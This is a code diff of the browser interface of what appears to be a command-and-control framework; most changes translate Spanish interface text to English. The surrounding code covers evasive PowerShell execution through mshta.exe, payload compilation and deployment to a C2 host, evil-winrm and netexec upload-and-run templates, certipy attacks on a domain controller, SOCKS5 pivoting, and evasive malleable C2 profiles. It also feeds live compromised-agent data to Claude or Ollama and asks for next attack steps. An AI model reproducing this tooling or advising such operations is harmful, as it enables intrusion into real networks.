+    note: 'Creates a PowerShell runspace via COM (System.Management.Automation) inside mshta.exe — powershell.exe does not appear in the process tree. Requires .NET Framework 3.5 and .ps1 payload. Not compatible with .NET 4.x-only systems without 3.5 enabled.',
   });
 
   // PS via rundll32 + shell32 (spawns under rundll32)
@@ -18074,7 +18074,7 @@ function renderScansTable() {
   const wrap = document.getElementById('scans-table-wrap');
   if (!wrap) return;
   if (!scanResults.length) {
-    wrap.innerHTML = '<p style="color:var(--text3);font-size:12px;padding:20px">Sin resultados. Botón derecho sobre agente → Port Scan.</p>';
+    wrap.innerHTML = '<p style="color:var(--text3);font-size:12px;padding:20px">No results. Right-click an agent → Port Scan.</p>';
     return;
   }
   const rows = [...scanResults].reverse().map(e => {
@@ -18434,7 +18434,7 @@ function opHistRender() {
       <span style="color:var(--text3);font-family:var(--font-mono);font-size:10px;min-width:28px;text-align:right">${i+1}</span>
       <span style="font-family:var(--font-mono);font-size:11px;color:var(--text);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(cmd)}</span>
       <button class="btn btn-ghost btn-sm" style="font-size:10px;padding:1px 6px;flex-shrink:0"
-        onclick="event.stopPropagation();opHistRun(${JSON.stringify(cmd)})" title="Ejecutar">▶</button>
+        onclick="event.stopPropagation();opHistRun(${JSON.stringify(cmd)})" title="Run">▶</button>
     </div>`).join('');
 }
 
@@ -18452,7 +18452,7 @@ function opHistRun(cmd) {
 }
 
 function opHistClear() {
-  if (!confirm('¿Limpiar todo el historial?')) return;
+  if (!confirm('Clear all history?')) return;
   opHistory.length = 0;
   opHistIdx = -1;
   opHistRender();
@@ -18739,7 +18739,7 @@ function opShowWelcome() {
   opWelcomeDone = true;
   const lines = [
     ['var(--accent)',  '⚡ Operator Terminal — herramientas locales en Kali'],
-    ['var(--text3)',   'Los comandos corren en esta máquina (Kali), no en el agente.'],
+    ['var(--text3)',   'Commands run on this machine (Kali), not on the agent.'],
     ['var(--text3)',   ''],
     ['var(--text2)',   'Ejemplos:'],
     ['var(--text)',    '  certipy-ad find -u localuser@cs.org -p pass -dc-ip 10.2.20.100 -vulnerable'],
@@ -18754,7 +18754,7 @@ function opShowWelcome() {
     ['var(--text3)',   ''],
     ['var(--text3)',   '! prefijo = forzar shell sin modificar   Ctrl+C = interrumpir'],
     ['var(--text3)',   ''],
-    ['var(--text2)',   'Variables (persisten entre comandos):'],
+    ['var(--text2)',   'Variables (persist between commands):'],
     ['var(--text)',    '  TARGET=10.10.10.10          # definir variable'],
     ['var(--text)',    '  nxc ldap $TARGET -u \'\' -p \'\'  # usar variable'],
     ['var(--text)',    '  vars                         # listar variables'],
@@ -18817,12 +18817,12 @@ async function aiLoadModels() {
   const ollamaUrl = document.getElementById('ai-url').value.trim().replace(/\/$/, '');
   const sel = document.getElementById('ai-model-sel');
   const cur = aiGetModel() || sel.value;
-  sel.innerHTML = '<option value="">Cargando…</option>';
+  sel.innerHTML = '<option value="">Loading…</option>';
   try {
     // Route through backend so the browser doesn't need direct access to Ollama
     const r = await api('GET', '/ai/ollama-models?url=' + encodeURIComponent(ollamaUrl));
     const models = (r.models || []).slice().sort();
-    if (!models.length) { sel.innerHTML = '<option value="">Sin modelos instalados</option>'; return; }
+    if (!models.length) { sel.innerHTML = '<option value="">No models installed</option>'; return; }
     sel.innerHTML = models.map(n =>
       `<option value="${esc(n)}" ${n===cur?'selected':''}>${esc(n)}</option>`
     ).join('');
@@ -18893,7 +18893,7 @@ async function aiSend() {
     model      = document.getElementById('ai-model-sel').value;
     ollama_url = document.getElementById('ai-url').value.trim().replace(/\/$/, '');
     api_key    = '';
-    if (!model) { toast('Selecciona un modelo primero', 'error'); return; }
+    if (!model) { toast('Select a model first', 'error'); return; }
   }
 
   aiSavePrefs();
@@ -18976,7 +18976,7 @@ function aiClearChat() {
   const wrap = document.getElementById('ai-messages');
   wrap.innerHTML = '';
   aiAddBubble('assistant',
-    '<strong>Chat limpiado.</strong> Puedes empezar una nueva conversación.',
+    '<strong>Chat cleared.</strong> You can start a new conversation.',
   );
 }
 
@@ -19035,7 +19035,7 @@ async function aiRunRecos(force) {
     api_key = (document.getElementById('ai-claude-key')?.value || localStorage.getItem('ai_claude_key') || '').trim();
     if (!api_key) {
       panel.style.display = '';
-      body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Configura la API key de Claude para el análisis automático.</div>';
+      body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Configure the Claude API key for automatic analysis.</div>';
       return;
     }
   } else if (provider === 'claude-code') {
@@ -19045,7 +19045,7 @@ async function aiRunRecos(force) {
     ollama_url = (document.getElementById('ai-url')?.value || '').trim().replace(/\/$/, '');
     if (!model) {
       panel.style.display = '';
-      body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Selecciona un modelo Ollama para activar el análisis automático.</div>';
+      body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Select an Ollama model to enable automatic analysis.</div>';
       return;
     }
   }
@@ -19101,7 +19101,7 @@ async function aiRunRecos(force) {
     aiRenderRecos(items);
     if (tsEl) tsEl.textContent = new Date().toLocaleTimeString('es', {hour:'2-digit', minute:'2-digit'});
   } catch(e) {
-    body.innerHTML = `<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Análisis no disponible: ${esc(e.message)}</div>`;
+    body.innerHTML = `<div style="padding:10px 14px;font-size:11px;color:var(--text3)">Analysis unavailable: ${esc(e.message)}</div>`;
   } finally {
     _aiRecosBusy = false;
   }
@@ -19148,7 +19148,7 @@ async function aiInjectContext() {
   ctx += `**Agentes activos (${active.length}):**\n`;
   for (const a of active) {
     const ago = Math.round((now - new Date(a.last_seen)) / 1000);
-    ctx += `- \`${a.username}@${a.hostname}\` — ${a.os} · IP ${a.ip} · PID ${a.pid} · sleep ${a.sleep_sec}s · último beacon hace ${ago}s\n`;
+    ctx += `- \`${a.username}@${a.hostname}\` — ${a.os} · IP ${a.ip} · PID ${a.pid} · sleep ${a.sleep_sec}s · last beacon ${ago}s ago\n`;
   }
   if (stale.length) {
     ctx += `\n**Agentes inactivos (${stale.length}):** ${stale.map(a => a.hostname).join(', ')}\n`;
@@ -19167,7 +19167,7 @@ async function aiInjectContext() {
     }
   } catch(_) {}
 
-  ctx += '\n¿Cuáles son los próximos pasos recomendados?';
+  ctx += '\nWhat are the recommended next steps?';
 
   const inp = document.getElementById('ai-input');
   inp.value = ctx;
@@ -19220,7 +19220,7 @@ async function aiCheckClaudeCode(){
     const badge=document.getElementById('ai-cc-status');
     if(!badge) return;
     if(r&&r.available){
-      badge.textContent='⚡ OAuth activo';
+      badge.textContent='⚡ OAuth active';
       badge.style.color='#5af78e';
     } else {
       badge.textContent='✗ Sin auth — ejecuta: claude login';
@@ -19281,7 +19281,7 @@ function aiStart(){
   } else {
     model=(document.getElementById('ai-model-sel').value||'').trim();
     ollama_url=(document.getElementById('ai-url').value||'').trim();
-    if(!model){alert('Selecciona un modelo Ollama en la toolbar');return;}
+    if(!model){alert('Select an Ollama model in the toolbar');return;}
     if(!ollama_url){alert('Falta Ollama URL');return;}
   }
 
@@ -19524,7 +19524,7 @@ async function aicCheckClaudeCode() {
     const badge = document.getElementById('aic-cc-status');
     if (!badge) return;
     if (r && r.available) {
-      badge.textContent = '⚡ OAuth activo';
+      badge.textContent = '⚡ OAuth active';
       badge.style.color = '#5af78e';
     } else {
       badge.textContent = '✗ Sin auth — ejecuta: claude login';
@@ -19782,7 +19782,7 @@ async function aicSend() {
 
   const cfg = aicGetConfig();
   if (cfg.provider === 'claude' && !cfg.api_key) {
-    toast('Configura la Anthropic API key en la pestaña 🤖 AI (se guarda en localStorage)', 'error'); return;
+    toast('Configure the Anthropic API key in the 🤖 AI tab (saved in localStorage)', 'error'); return;
   }
   if (cfg.provider === 'ollama' && !cfg.model) {
     toast('Escribe el nombre del modelo Ollama en la barra del AI Console', 'error'); return;
@@ -19994,7 +19994,7 @@ function socks5List() {
     })
     .filter(Boolean);
   if (active.length === 0) {
-    toast('No hay proxies SOCKS5 activos registrados en esta sesión', 'warn');
+    toast('No active SOCKS5 proxies registered in this session', 'warn');
   } else {
     active.forEach(line => toast('SOCKS5: ' + line, 'blue'));
   }
@@ -20096,7 +20096,7 @@ function socks5List() {
         </div>
       </div>
       <div id="gh-panel-mg" style="display:none">
-        <p style="font-size:11px;color:var(--text3);margin-bottom:6px">mgeeky/malleable-c2 — perfiles jQuery altamente evasivos, múltiples versiones (3.11–4.2).</p>
+        <p style="font-size:11px;color:var(--text3);margin-bottom:6px">mgeeky/malleable-c2 — highly evasive jQuery profiles, multiple versions (3.11–4.2).</p>
         <div id="gh-list-mg" style="max-height:300px;overflow-y:auto;display:flex;flex-direction:column;gap:4px">
           <span style="color:var(--text3);font-size:12px">Loading...</span>
         </div>
@@ -20170,7 +20170,7 @@ async function importProfileFromURL() {
   if (btn) { btn.disabled = true; btn.textContent = '…'; }
   try {
     const fr = await api('GET', '/api/profiles/fetch?url=' + encodeURIComponent(rawUrl));
-    if (!fr || !fr.ok) throw new Error(fr?.error || 'Error descargando el perfil');
+    if (!fr || !fr.ok) throw new Error(fr?.error || 'Error downloading profile');
     let name = nameEl.value.trim();
     if (!name) {
       const base = rawUrl.split('/').pop().replace(/\.profile$/i,'').replace(/[^a-zA-Z0-9._-]/g,'_');
@@ -20260,14 +20260,14 @@ async function ghFetchDir(url) {
 async function ghFetchRepo(key) {
   const listEl = document.getElementById('gh-list-' + key);
   if (!listEl) return;
-  listEl.innerHTML = '<span style="color:var(--text3);font-size:12px">Cargando desde GitHub…</span>';
+  listEl.innerHTML = '<span style="color:var(--text3);font-size:12px">Loading from GitHub…</span>';
   try {
     const entries = await ghFetchDir(_GH_REPOS[key]);
     if (!Array.isArray(entries)) throw new Error('Respuesta inesperada de GitHub');
 
     let profiles = entries.filter(f => f.type === 'file' && /\.profile$/i.test(f.name));
 
-    // Si no hay .profile en la raíz, busca en subdirectorios (1 nivel)
+    // If no .profile in root, search in subdirectories (1 level)
     if (profiles.length === 0) {
       const dirs = entries.filter(f => f.type === 'dir');
       const subResults = await Promise.allSettled(dirs.map(d => ghFetchDir(d.url)));
@@ -20727,10 +20727,10 @@ netexec smb ${target} ${nxeAuth} \\
   -x '${rpath}'`,
 
     'evilwinrm':
-`# Sesión interactiva WinRM (puerto 5985)
+`# Interactive WinRM session (port 5985)
 evil-winrm ${ewAuth}
 
-# Dentro de la sesión:
+# Inside the session:
 # upload ${lbin}
 # .\\${rName}`,
 
@@ -20774,7 +20774,7 @@ function ipcCopy(id) {
   const el = document.getElementById('ipc-' + id);
   if (!el) return;
   navigator.clipboard.writeText(el.textContent)
-    .then(() => toast('Copiado', 'green'));
+    .then(() => toast('Copied', 'green'));
 }
 
 let _ipcRunAbort = null;
@@ -21125,7 +21125,7 @@ async function ipcStageLocalPayload(filename) {
     if (last) command += ` && chmod 700 ${shellQuote(path)} && printf '%s\\n' ${marker}`;
     const output = await _execOneshot(command);
     if (last && !output.includes(marker)) {
-      throw new Error('falló la escritura local del payload');
+      throw new Error('local payload write failed');
     }
   }
   return {dir, path, name: base};
@@ -21302,7 +21302,7 @@ async function ibuildAndDeploy() {
   // C2 URL: use pay-host/pay-port if available, otherwise c2IPs[0]
   let host = document.getElementById('pay-host')?.value.trim();
   if (!host && c2IPs?.length) host = c2IPs[0];
-  if (!host) { toast('Host vacío — no se puede determinar IP del C2', 'error'); return; }
+  if (!host) { toast('Empty host — cannot determine C2 IP', 'error'); return; }
   const port = document.getElementById('pay-port')?.value.trim() || '8080';
   const _scheme = (trans === 'mtls' || trans === 'https') ? 'https' : (trans === 'tcp' ? 'tcp' : 'http');
   const c2url = (trans === 'tcp') ? `${host}:${port}` : `${_scheme}://${host}:${port}`;
@@ -21328,8 +21328,8 @@ async function ibuildAndDeploy() {
     });
 
     if (!buildResp?.ok || !buildResp.data?.exe) {
-      toast('Error al compilar payload', 'error');
-      outEl.innerHTML = '<span style="color:var(--red)">Build falló</span>';
+      toast('Error compiling payload', 'error');
+      outEl.innerHTML = '<span style="color:var(--red)">Build failed</span>';
       _ipcSetRunning(false);
       return;
     }
@@ -21859,30 +21859,30 @@ async function bhRefreshFiles() {
 }
 
 async function bhImportUpload(agentID, filename) {
-  toast(`Importando ${filename}…`, 'blue');
+  toast(`Importing ${filename}…`, 'blue');
   const r = await api('POST', '/api/bloodhound/import-local', {
     agent_id: agentID, filename,
   });
   if (!r?.ok) {
-    toast('Error al importar: ' + (r?.error || 'desconocido'), 'red');
+    toast('Error importing: ' + (r?.error || 'unknown'), 'red');
     return;
   }
-  toast(`BloodHound importado: ${r.data.nodes} nodos, ${r.data.edges} aristas`, 'green');
+  toast(`BloodHound imported: ${r.data.nodes} nodes, ${r.data.edges} edges`, 'green');
   await bhRefreshFiles();
   await bhReload();
 }
 
 async function bhDeleteUpload(agentID, filename) {
-  if (!confirm(`¿Eliminar el ZIP de BloodHound "${filename}"?`)) return;
+  if (!confirm(`Delete BloodHound ZIP "${filename}"?`)) return;
   const path = agentID
     ? `${encodeURIComponent(agentID)}/${encodeURIComponent(filename)}`
     : encodeURIComponent(filename);
   const r = await api('DELETE', `/api/dl/${path}`);
   if (!r?.ok) {
-    toast('Error al eliminar: ' + (r?.error || 'desconocido'), 'red');
+    toast('Error deleting: ' + (r?.error || 'unknown'), 'red');
     return;
   }
-  toast('ZIP de BloodHound eliminado', 'yellow');
+  toast('BloodHound ZIP deleted', 'yellow');
   bhRefreshFiles();
 }
 
@@ -22452,15 +22452,15 @@ document.addEventListener('DOMContentLoaded', () => {
 <div class="modal-overlay" id="modal-sudo" style="display:none">
   <div class="modal" style="max-width:360px">
     <div class="modal-header">
-      <span class="modal-title">🔑 sudo — contraseña requerida</span>
+      <span class="modal-title">🔑 sudo — password required</span>
       <button class="modal-close btn" onclick="closeModal('modal-sudo')">✕</button>
     </div>
     <div class="modal-body" style="display:flex;flex-direction:column;gap:12px">
-      <div style="font-size:12px;color:var(--text3)">Introduce la contraseña de <code>kali</code> para ejecutar el comando con sudo.</div>
+      <div style="font-size:12px;color:var(--text3)">Enter the <code>kali</code> password to run the command with sudo.</div>
       <div style="font-family:var(--font-mono);font-size:11px;color:var(--text2);background:var(--bg2);padding:6px 10px;border-radius:4px;word-break:break-all" id="sudo-cmd-preview"></div>
-      <input id="sudo-pass-input" type="password" placeholder="Contraseña sudo…" autocomplete="current-password" style="width:100%">
+      <input id="sudo-pass-input" type="password" placeholder="Sudo password…" autocomplete="current-password" style="width:100%">
       <div style="display:flex;gap:8px;justify-content:flex-end">
-        <button class="btn btn-ghost" onclick="closeModal('modal-sudo')">Cancelar</button>
+        <button class="btn btn-ghost" onclick="closeModal('modal-sudo')">Cancel</button>
         <button class="btn btn-primary" onclick="sudoConfirm()">Ejecutar</button>
       </div>
     </div>
